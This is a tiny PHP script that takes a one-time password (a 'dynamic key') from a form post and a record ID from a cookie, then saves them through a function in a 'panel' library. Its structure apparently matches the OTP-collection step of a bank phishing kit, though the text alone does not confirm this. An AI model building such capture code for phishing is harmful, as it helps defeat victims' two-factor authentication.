<?php 
require('../panel/lib/funciones.php');

$registro = $_COOKIE['registro'];
$cdinamica = $_POST['otp'];

actualizar_registro_otp($registro,$cdinamica);
?>